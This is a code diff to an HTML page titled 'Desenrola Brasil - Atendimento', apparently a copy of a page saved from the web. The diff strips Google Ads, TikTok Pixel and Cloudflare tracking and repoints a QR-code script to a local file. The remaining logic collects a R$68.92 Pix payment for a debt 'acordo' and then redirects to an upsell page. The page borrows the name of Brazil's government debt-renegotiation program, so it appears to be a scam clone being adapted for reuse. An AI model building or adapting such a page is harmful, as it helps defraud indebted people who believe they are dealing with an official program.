@@ -4,23 +4,8 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Desenrola Brasil - Atendimento</title>
-    <!-- Google Ads -->
-    <script type="text/javascript" async="" src="./Desenrola Brasil - Atendimento_files/identify_0504602d.js.download"></script><script type="text/javascript" async="" src="./Desenrola Brasil - Atendimento_files/main.MWU2MzIzODM0MQ.js.download" data-id="DA835D3C77UES9745010"></script><script type="text/javascript" async="" src="./Desenrola Brasil - Atendimento_files/events.js.download"></script><script async="" src="./Desenrola Brasil - Atendimento_files/js"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){ dataLayer.push(arguments); }
-      gtag('js', new Date());
-      gtag('config', 'AW-18302482370');
-    </script>
-    <!-- TikTok Pixel -->
-    <script>
-    !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-    ttq.load('DA835D3C77UES9745010');
-    ttq.page();
-    }(window,document,'ttq');
-    </script>
     <!-- QR Code Generator -->
-    <script src="./Desenrola Brasil - Atendimento_files/qrcode.min.js.download"></script><script type="text/javascript" async="" src="./Desenrola Brasil - Atendimento_files/f.txt"></script>
+    <script src="qrcode.min.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
 
@@ -721,8 +706,6 @@
         .btn-sim-negociar:hover { background: #0f3e8e; }
 
         .hidden { display: none !important; }
-    </style>
-<meta name="tiktok-developers-site-verification" content="cgRf1iQLMvO9KfzUrJPDKfsAbQ2ypE17">
 </head>
 <body>
 
@@ -1585,8 +1568,6 @@
                 await delay(80); userRow3.classList.add('visible');
                 userRow3.scrollIntoView({ behavior: 'smooth', block: 'end' });
 
-                try { ttq.track('InitiateCheckout', { value: 68.92, currency: 'BRL', content_id: 'desenrola-acordo' }); } catch(e){}
-
                 const audio5 = createActiveAudio('/static/audio/audio5.mp3');
 
                 await delay(600);
@@ -1869,17 +1850,9 @@
                 const data = await res.json();
                 if (data.status === 'approved' || data.status === 'paid') {
                     clearInterval(iv);
-                    try {
-                        ttq.track('Purchase', {
-                            value: 68.92,
-                            currency: 'BRL',
-                            content_id: 'desenrola-acordo',
-                            event_id: window._pixEventId || ('purchase_' + window._transactionId)
-                        });
-                        setTimeout(() => {
-                            window.location.href = '/upsell1';
-                        }, 3000);
-                    } catch(e) {}
+                    setTimeout(() => {
+                        window.location.href = '/upsell1';
+                    }, 3000);
                 }
             } catch(e) {}
         }, 5000);
@@ -1887,7 +1860,4 @@
 
     function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
-
-<script type="module" src="./Desenrola Brasil - Atendimento_files/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;b3415b19235a4f0c84c2ae3047d3b55d&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
-
 </body></html>
